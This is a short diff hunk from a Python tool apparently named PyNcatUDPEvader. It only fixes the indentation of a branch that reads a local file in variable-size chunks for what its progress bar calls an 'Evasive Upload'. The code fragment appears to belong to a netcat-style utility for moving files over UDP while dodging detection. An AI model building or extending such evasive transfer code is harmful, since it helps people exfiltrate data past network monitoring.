@@ -417,7 +417,7 @@ class PyNcatUDPEvader:
                     finally:
                         heartbeat_running.clear()
                     return
-                                elif self.args.file and os.path.exists(self.args.file):
+                    elif self.args.file and os.path.exists(self.args.file):
                     filesize = os.path.getsize(self.args.file)
                     min_c, max_c = max(16, self.args.min_chunk), min(1400, self.args.max_chunk)
                     with open(self.args.file, 'rb') as f, tqdm.tqdm(total=filesize, unit='B', unit_scale=True, desc="Evasive Upload") as pbar:
